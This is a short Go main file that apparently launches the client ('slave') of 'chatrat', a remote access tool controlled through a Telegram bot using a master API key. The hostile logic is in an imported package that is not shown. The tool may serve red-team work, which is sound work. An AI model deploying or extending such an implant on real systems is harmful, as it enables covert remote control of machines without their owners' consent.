package main

import (
	"os"

	"github.com/CoveoSec/chatrat/pkg/core"
	"github.com/joho/godotenv"
	"github.com/lithammer/shortuuid/v4"
)

func main() {
	godotenv.Load()

	token := os.Getenv("MASTER_API_KEY")
	id := shortuuid.New()
	botType := "telegram"

	_ = core.NewSlave(token, botType, id)

}
